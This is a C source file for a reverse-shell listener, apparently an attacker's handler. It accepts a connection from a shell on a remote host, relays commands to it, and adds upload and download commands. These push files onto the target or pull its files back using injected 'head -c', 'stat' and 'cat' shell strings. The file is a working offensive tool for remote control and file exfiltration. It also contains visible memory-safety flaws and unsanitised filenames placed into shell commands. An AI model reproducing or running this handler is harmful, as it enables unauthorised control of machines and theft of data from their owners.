#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <dirent.h>

#define BUFFER 4096

int main(int argc, char *argv[]) {
	if (argc != 2) {
		printf("Usage: %s <port>\n", argv[0]);
		return 1;
	}

	int port = atoi(argv[1]);
	if (port <= 0 || port > 65535) {
		printf("Invalid port, only 1-65535\n");
		return 1;
	}

	int server_fd, client_fd;
	struct sockaddr_in addr;
	int opt = 1;
	int addrlen = sizeof(addr);
	char buffer[BUFFER] = {0};

	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
		perror("Socket creation failed");
		exit(EXIT_FAILURE);
	}

	if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
		perror("Setsockopt failed");
		exit(EXIT_FAILURE);
	}

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);

	if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("Bind failed");
		exit(EXIT_FAILURE);
	}

	printf("Listening on port %d\n", port);
	if (listen(server_fd, 3) < 0) {
		perror("Listen failed");
		exit(EXIT_FAILURE);
	}

	if ((client_fd = accept(server_fd, (struct sockaddr *)&addr, (socklen_t*)&addr)) < 0) {
		perror("Accept failed");
		exit(EXIT_FAILURE);
	}

	printf("Connection estabilished!\n");
	printf("Type your commands below:\n\n");

	fd_set read_fds;
	int print_prompt = 1;
	while (1) {

		if (print_prompt) {
			printf("handler>> ");
			fflush(stdout);
			print_prompt = 0;
		}

		FD_ZERO(&read_fds);
		FD_SET(STDIN_FILENO, &read_fds);
		FD_SET(client_fd, &read_fds);

		select(client_fd + 1, &read_fds, NULL, NULL, NULL);

		if (FD_ISSET(client_fd, &read_fds)) {
			int valread = read(client_fd, buffer, BUFFER);
			if (valread == 0) {
				printf("\nConnection closed\n");
				break;
			}
			buffer[valread] = '\0';
			printf("\n%s\n", buffer);
			fflush(stdout);
			print_prompt = 1;
		}
		if (FD_ISSET(STDIN_FILENO, &read_fds)) {
			int valread = read(STDIN_FILENO, buffer, BUFFER);
			buffer[valread] = '\0';

			if (valread <= 1 && (buffer[0] == '\n' || buffer[0] == '\r' || buffer[0] == '\r')) {
				print_prompt = 1;
				continue;
			}

			char cmd[20] = {0};
			char filename1[256] = {0};
			char filename2[256] = {0};

			int parsed = sscanf(buffer, "%s %s %s", cmd, filename1, filename2);

			if (parsed <= 0) {
				print_prompt = 1;
				continue;
			}

			if (strcmp(cmd, "upload") == 0 && strlen(filename2) > 0) {
				printf("uploading\n");

				FILE *file = fopen(filename1, "rb");
				if (file == NULL) {
					printf("file not found\n");
					print_prompt = 1;
					continue;
				}

				fseek(file, 0, SEEK_END);
				long filesize = ftell(file);
				fseek(file, 0, SEEK_SET);

				if (filesize <= 0) {
					printf("Can't chunk file bytes");
					print_prompt = 1;
					continue;
				}

				char remote_cmd[450];
				sprintf(remote_cmd, "head -c %ld > %s\n", filesize, filename2);
				send(client_fd, remote_cmd, strlen(remote_cmd), 0);
				usleep(100000);

				char file_buf[BUFFER];
				int byte_read;
				long total = 0;

				while ((byte_read = fread(file_buf, 1, BUFFER, file)) > 0) {
					send(client_fd, file_buf, byte_read, 0);
					total += byte_read;
				}
				fclose(file);
				printf("uploaded %ld byte\n", total);
				print_prompt = 1;
			}
			else if (strcmp(cmd, "download") == 0 && strlen(filename2) > 0) {

				char check_cmd[350];
				sprintf(check_cmd, "if [ -f \'%s' ]; then stat -c %%s \'%s\'; else echo \'NOT_FOUND\'; fi\n", filename1, filename1);
				send(client_fd, check_cmd, strlen(check_cmd), 0);

				char size_buf[64] = {0};
				long remote_file_size = 0;

				int byte_recv = recv(client_fd, size_buf, sizeof(size_buf) - 1, 0);
				if (byte_recv <= 0) {
					printf("connection lost when checking target file\n");
					print_prompt = 1;
					continue;
				}
				size_buf[byte_recv] = '\0';

				if (strstr(size_buf, "NOT_FOUND") != NULL) {
					printf("file not found\n");
					print_prompt = 1;
					continue;
				}

				remote_file_size = atol(size_buf);
				if (remote_file_size <= 0) {
					printf("file size is not valid (empty byte)\n");
					print_prompt = 1;
					continue;
				}
				printf("downloading %ld byte\n", remote_file_size);

				FILE *file = fopen(filename2, "wb");
				if (file == NULL) {
					printf("failed to make file\n");
					print_prompt = 1;
					continue;
				}

				char pipe[350];
				sprintf(pipe, "cat \"%s\"\n", filename1);
				send(client_fd, pipe, strlen(pipe), 0);
				usleep(100000);

				char file_buf[BUFFER];
				long total_recv = 0;

				while (total_recv < remote_file_size) {
					long remain = remote_file_size - total_recv;
					int to_read = (remain < BUFFER) ? remain : BUFFER;

					int chunk = recv(client_fd, file_buf, to_read, 0);
					if (chunk <= 0) {
						printf("connection lost while transfering binary\n");
						print_prompt = 1;
						break;
					}
					fwrite(file_buf, 1, chunk, file);
					total_recv += chunk;
				}
				fclose(file);

				if (total_recv == remote_file_size) {
					printf("downloaded\n");
				} else {
					printf("downloaded: file might be corrupted\n");
					print_prompt = 1;
				}
			}
			else {
				send(client_fd, buffer, valread, 0);
				usleep(50000);
				print_prompt = 1;
			}
		}
	}
	close(client_fd);
	close(server_fd);
	return 0;
}
